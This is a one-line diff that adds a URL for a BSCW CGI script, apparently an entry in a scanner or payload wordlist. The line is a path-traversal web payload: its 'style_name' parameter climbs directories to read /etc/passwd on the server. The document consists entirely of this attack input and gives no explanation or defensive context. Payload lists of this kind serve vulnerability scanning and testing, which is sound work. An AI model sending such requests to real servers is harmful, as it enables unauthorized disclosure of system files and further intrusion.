@@ -1,0 +1,1 @@
+/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd
